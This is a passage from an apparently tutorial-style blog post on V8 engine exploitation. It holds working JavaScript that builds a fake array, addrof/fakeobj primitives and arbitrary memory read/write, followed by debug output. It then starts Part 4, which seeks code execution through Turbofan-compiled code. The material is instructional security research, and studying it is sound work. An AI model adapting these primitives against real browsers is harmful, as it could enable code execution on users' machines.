  <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>];
}
<!---->
<span class="jsConNull">// bigint to 32-bit hex string</span>
<span class="jsConKw">function</span> <span class="jsConIdx">hex32</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">8</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// bigint to 64-bit hex string</span>
<span class="jsConKw">function</span> <span class="jsConIdx">hex64</span>(<span class="jsConIdx">i</span>) {
  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">16</span>, <span class="jsConValIn">0</span>);
}
<!---->
<span class="jsConNull">// set up variables</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">tmpObj</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
<span class="jsConKw">const</span> <span class="jsConIdx">objArr</span> = [<span class="jsConVar">tmpObj</span>];
<!---->
<span class="jsConNull">// check the address of arr</span>
%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">arr</span>);
<!---->
<span class="jsConNull">// set up the fake array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">arrAddr</span> = <span class="jsConValIn">0x12345678n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">arrElementsAddr</span> = <span class="jsConVar">arrAddr</span> - <span class="jsConValIn">0x20n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x10n</span>;
<span class="jsConKw">const</span> <span class="jsConIdx">fakeElementsAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x8n</span>;
<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
<span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000010000000000n</span> + <span class="jsConVar">fakeElementsAddr</span>);
<!---->
<span class="jsConNull">// do the exploit</span>
<span class="jsConKw">const</span> <span class="jsConIdx">tmp</span> = [<span class="jsConValIn">1.1</span>];
<span class="jsConKw">const</span> <span class="jsConIdx">evil</span> = {
  <span class="jsConFun">valueOf</span>: () =&gt; {
    <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
    <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">arrAddr</span> ^ <span class="jsConVar">fakeAddr</span>);
  }
};
<span class="jsConVar">tmp</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>);
<!---->
<span class="jsConNull">// this is the fake 128-element array</span>
<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>];
<!---->
<span class="jsConNull">// print out the data in the fake array</span>
<span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">oob</span>.<span class="jsConFun">length</span>; <span class="jsConVar">i</span>++) {
  <span class="jsConKw">const</span> <span class="jsConIdx">addr</span> = <span class="jsConVar">hex32</span>(<span class="jsConVar">fakeElementsAddr</span> + <span class="jsConVar">BigInt</span>(<span class="jsConVar">i</span> + <span class="jsConValIn">1</span>)*<span class="jsConValIn">0x8n</span> - <span class="jsConValIn">1n</span>);
  <span class="jsConKw">const</span> <span class="jsConIdx">val</span> = <span class="jsConVar">hex64</span>(<span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConVar">i</span>]));
  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`</span>${<span class="jsConVar">addr</span>}<span class="jsConStr">: </span>${<span class="jsConVar">val</span>}<span class="jsConStr">`</span>);
}</div>
</div>

The beginning of the script sets up some helper functions. Then we create an array to store our fake array in as before, and also another array that has a random object in it.

To set up the fake array, we must know where our real array is at in memory. There are ways to accomplish this, but for now we'll just run %DebugPrint and use its output to change the **arrAddr** value in the code to what the memory address should be. This approach works okay in a controlled environment like ours (we'll need to keep updating the address as we change the code), but breaks apart when attacking browsers in the real world. I'll show how to overcome this shortcoming later in the post.

We can then guess how the rest of the memory lines up and use offsets to set a few other variables, such as the **fakeElementsAddr** which we add to the header of the fake array so that it points to where the fake array's elements are.

Once everything's set up we do the xor exploit thing and end up with the fake array in `tmp[0]`. We assign it to the `oob` variable for convenience and print its memory out in a format similar to the gdb output. Let's run it!

<div class="jsMem">
	<div class="jsMemTitle">VARS<div class="jsMemSep"></div></div>
	<div class="jsMemDbg"><span class="jsMemVar2">arr</span> = [5.43231e-312, <span class="jsMemVar0">3.88113e-311</span>, <span class="jsMemVar1">5.43231e-312</span>] // <span class="jsMemVar13">0x000432f9</span>
<span class="jsMemVar3">tmpObj</span> = {<span class="jsMemVar5">a</span>: <span class="jsMemVar4">1</span>} // <span class="jsMemVar11">0x00043309</span>
<span class="jsMemVar9">objArr</span> = <span class="jsMemVar10">[<span class="jsMemVar11">tmpObj</span>]</span> // <span class="jsMemVar14">0x00043341</span>
<span class="jsMemVar0">oob</span> = [...] // <span class="jsMemVar12">0x000432e9</span></div>
<div class="jsMemTitle">OUT<div class="jsMemSep"></div></div>
	<div class="jsMemHex">$ ./d8 --allow-natives-syntax exploit.js
<span class="jsMemVar12">0x000432e8</span>: 0x<span class="jsMemVar0">00000725001cb7c5</span>
0x000432f0: 0x<span class="jsMemVar1">00000100000432e1</span>
<span class="jsMemVar13">0x000432f8</span>: 0x<span class="jsMemVar2">00000725001cb7c5</span>
0x00043300: 0x<span class="jsMemVar2">00000006000432d9</span>
<span class="jsMemVar11">0x00043308</span>: 0x<span class="jsMemVar3">00000725001d3b05</span>
0x00043310: 0x<span class="jsMemVar4">00000002</span>00000725
0x00043318: 0x0001000100000685
0x00043320: 0x0000074d00000000
0x00043328: 0x00000084<span class="jsMemVar5">00002af1</span>
0x00043330: 0x<span class="jsMemVar10">0000056d</span>00000002
0x00043338: 0x<span class="jsMemVar11">00043309</span><span class="jsMemVar10">00000002</span>
<span class="jsMemVar14">0x00043340</span>: 0x<span class="jsMemVar9">00000725001cb845</span>
0x00043348: 0x<span class="jsMemVar9">0000000200043335</span>
...</div></div>

Neat! If we stare at the patterns in the memory we can make out the other arrays and stuff we initialized earlier. And if you think about it, we pretty much already have the **addrof** and **fakeobj** primitives here. At <span class="jsMemVarExt11">index 10</span>, we can get the address of the object currently in objArr, so if we put an object of our choice in that array we can see its address. And if we put an address to an object at that index, we'll be able to access it through the objArr array. That'll be our **addrof** and **fakeobj**!

Let's write the primitives to get and set the upper 32 bits:

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) >> <span class="jsConValIn">32n</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + (<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>));
  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
}</div>
</div>

If the address were at the lower bits instead, we'd need to modify the code a bit accordingly:

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFF00000000n</span>;
  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + <span class="jsConVar">a</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
}</div>
</div>

Time to try them out! Let's do an experiment where we first try to get the address of our fake array, and then turn that address into a new pointer to that array.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex32</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">oob</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x000432e9</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConValIn">0x000432e9n</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(128) [<span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">1.27321098e-313</span>, (124&nbsp;more)...]</i></summary>
<div style="padding-left: 24px">
<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
<span class="jsConIdx jsConB">3</span>: <span class="jsConValOut">0x0000000600042bc9</span><br/>
<span style="padding-left: 4px"><i>(124&nbsp;more)...</i><br/></span>
</div>
	</details></div>
</div>

Sweet! The pointer addresses here are tagged, so they're 1 bigger than the actual memory locations. We could make addrof and fakeobj subtract and add 1 to see and use the actual memory addresses, but it's a matter of taste.

Lastly we'll want to create primitives to arbitrarily **read** and **write** memory. To do that, we can create a new array, point it at any memory location we desire, and then read or write its first element. Although we did set the length of an array in two separate memory locations earlier, it turns out this isn't always required depending on what we want to do. If we just want to read or write a single double, we can just specify the desired address in the array header and it'll do the trick.

<div class="jsConsole">
	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">addr</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">readArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);<wbr><span class="jsConNull" style="text-wrap: nowrap"> // array header from earlier</span>
  <span class="jsConVar">readArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">readArr</span>) - <span class="jsConValIn">0x10n</span>)[<span class="jsConValIn">0</span>]);
}
<!---->
<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">addr</span>, <span class="jsConIdx">data</span>) {
  <span class="jsConKw">const</span> <span class="jsConIdx">writeArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
  <span class="jsConKw">const</span> <span class="jsConIdx">fakeArr</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">writeArr</span>) - <span class="jsConValIn">0x10n</span>);
  <span class="jsConVar">fakeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">data</span>);
}</div>
</div>

Did you know that strings in JavaScript are immutable! Anyways let's mutate them using the cool new functions we cooked up.

<div class="jsConsole">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">text </span> = <span class="jsConStr">"ponypony"</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'ponypony'</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">textAddr</span> = <span class="jsConVar">addrof</span>(<span class="jsConVar">text</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex32</span>(<span class="jsConVar">textAddr</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x001d35fd</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex64</span>(<span class="jsConVar">read</span>(<span class="jsConVar">textAddr</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x430b3ed2000003dd</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex64</span>(<span class="jsConVar">read</span>(<span class="jsConVar">textAddr</span> + <span class="jsConValIn">0xcn</span>))</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x796e6f70796e6f70</span><wbr><span class="jsConNull" style="white-space: pre"> // ynopynop</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">write</span>(<span class="jsConVar">textAddr</span> + <span class="jsConValIn">0xcn</span>, <span class="jsConValIn">0x6172796c6172796cn</span>)<wbr><span class="jsConNull" style="white-space: pre"> // arylaryl</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">text</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConStrOut">'lyralyra'</span></div>
</div>


We've done the impossible! Imagine how much we're gonna be able to speed up the performance of our webapps by running this exploit and making strings mutable.

## Part 4: Code execution

So we can read and write any memory, how do we turn this into code execution?

We'd probably want to start by looking at how code gets stored and run for functions and stuff.

<div class="jsConsole" style="margin-bottom: 4px">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">func</span><span style="white-space: pre-wrap">() {
     <span class="jsConKw">return</span> <span class="jsConValIn">0x1337</span>;
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
</div>

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: 0x3069001d34c9: [Function] in OldSpace
 - map: 0x3069001c097d &lt;Map[32](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x3069001c08a5 &lt;JSFunction (sfi = 0x306900141885)&gt;
 - elements: 0x306900000725 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - function prototype: 
 - initial_map: 
 - shared_info: 0x3069001d3439 &lt;SharedFunctionInfo func&gt;
 - name: 0x3069001d33bd &lt;String[4]: #func&gt;
 - builtin: InterpreterEntryTrampoline
 - formal_parameter_count: 0
 - kind: NormalFunction
 - context: 0x3069001c0205 &lt;NativeContext[295]&gt;
 - code: 0x306900032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;
 - interpreted
 - bytecode: 0x3069002006a5 &lt;BytecodeArray[5]&gt;
 - source code: () { return 0x1337 }
 - properties: 0x306900000725 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): { ... }
 - feedback vector: No feedback vector, but we have a closure feedback cell array</div>
<div class="jsMemTitle">GDB<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0x3069001d34c8: 0x00000725001c097d 0x00032cc100000725
0x3069001d34d8: 0x001c0205001d3439 0x00000741001d34b1
0x3069001d34e8: 0x001d33bd00000a91 0x001d34c9000084a0</div>
</div>

Ooh we've got something called **code** there! But it's some sort of a **InterpreterEntryTrampoline**, what's that?

Looking it up, it seems like it's bytecode generated by [Ignition](https://v8.dev/blog/ignition-interpreter). This V8-specific bytecode is run by a VM and is made specifically for JavaScript. It won't be much use to us because we want to run computer code that can hack a computer, not chrome code that can hack a website. Looking further into V8 docs we find [Maglev](https://v8.dev/blog/maglev) and [Turbofan](https://v8.dev/docs/turbofan), the latter of which seems like a great fit for us because it compiles into machine code.

But our function is still the trampoline thing! How do we turn it into a turbofan thing?

We need to make V8 think it's important to optimize our code by running it a lot of times, or using debug commands. If we still have the V8 natives syntax enabled from earlier, we can use **%PrepareFunctionForOptimization()** and **%OptimizeFunctionOnNextCall()** to do the trick.

<div class="jsConsole" style="margin-bottom: 4px">
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConKw">function</span> <span class="jsConIdx">func</span><span style="white-space: pre-wrap">() {
     <span class="jsConKw">return</span> <span class="jsConValIn">0x1337</span>;
   }</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
 - code: 0x2d7a000332c1 &lt;Code BUILTIN CompileLazy&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
 - code: 0x2d7a00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">PrepareFunctionForOptimization</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
 - code: 0x2d7a00032cc1 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">OptimizeFunctionOnNextCall</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">func</span>()</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">4919</span></div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">func</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine jsConTerm">DebugPrint: 0x2d7a001d3fb9: [Function] in OldSpace
 - code: 0x2d7a002006ed &lt;Code TURBOFAN&gt;</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">codeObj</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConValIn">0x002006ed</span>)</div>
	<div class="jsConBorder"></div>
	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg>%<span class="jsConV8">DebugPrint</span>(<span class="jsConVar">codeObj</span>)</div>
</div>

<div class="jsMem">
	<div class="jsMemTitle">V8<div class="jsMemSep"></div></div>
	<div class="jsMemDbg">DebugPrint: 0x2d7a002006ed: [Code]
 - map: 0x2d7a00000d61 &lt;Map[64](CODE_TYPE)&gt;
 - kind: TURBOFAN
 - deoptimization_data_or_interpreter_data: 0x2d7a0020066d &lt;Other heap object (PROTECTED_FIXED_ARRAY_TYPE)&gt;
 - position_table: 0x2d7a00180011 &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
 - instruction_stream: 0x5555b79416f1 &lt;InstructionStream TURBOFAN&gt;
 - instruction_start: 0x5555b7941700
 - is_turbofanned: 1
 - stack_slots: 6
 - marked_for_deoptimization: 0
 - embedded_objects_cleared: 0
 - can_have_weak_objects: 1
 - instruction_size: 124
 - metadata_size: 12
 - inlined_bytecode_size: 0
 - osr_offset: -1
 - handler_table_offset: 12
 - unwinding_info_offset: 12
 - code_comments_offset: 12
 - instruction_stream.relocation_info: 0x2d7a002006dd &lt;Other heap object (TRUSTED_BYTE_ARRAY_TYPE)&gt;
 - instruction_stream.body_size: 136
<!---->
--- Disassembly: ---
kind = TURBOFAN
stack_slots = 6
compiler = turbofan
address = 0x2d7a002006ed
<!---->
Instructions (size = 124)
0x5555b7941700     0  8b59f4               movl rbx,[rcx-0xc]
0x5555b7941703     3  4903de               REX.W addq rbx,r14
0x5555b7941706     6  f6431e20             testb [rbx+0x1e],0x20
0x5555b794170a     a  0f85f05e03a0         jnz 0x555557977600  (CompileLazyDeoptimizedCode)    ;; near builtin entry
0x5555b7941710    10  55                   push rbp
...</div>
<div class="jsMemTitle">GDB [0x2d7a002006ed]<div class="jsMemSep"></div></div>
	<div class="jsMemHex">0x2d7a002006ec: 0x0020066d00000d61  0x001d485100180011
0x2d7a002006fc: 0xb7941700b79416f1  0x800000dc00005555
0x2d7a0020070c: 0x0000000c0000007c  0xffffffff00000000
0x2d7a0020071c: 0x0000000c0000000c  0xffff00010000000c
0x2d7a0020072c: 0x0000000800000595  0x001d33fd001d3459
0x2d7a0020073c: 0x001d4881001d3541  0x0000004e00000949
0x2d7a0020074c: 0x00000000001d4891  0x0020072d00180011
0x2d7a0020075c: 0x0000001000000010  0x00b0081700000000
0x2d7a0020076c: 0xf8f937030bc90cca  0xb00f17ca03012100
